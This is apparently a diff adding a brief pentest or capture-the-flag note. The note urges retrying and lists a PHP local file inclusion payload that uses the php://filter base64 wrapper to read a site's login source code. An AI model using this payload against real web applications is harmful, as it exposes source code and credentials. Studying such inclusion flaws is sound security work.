@@ -1,0 +1,6 @@
+
+Things that didn't work the first time may work the second time around.
+
+/index.php?file=login
+
+/index.php?file=php://filter/convert.base64-encode/resource=login
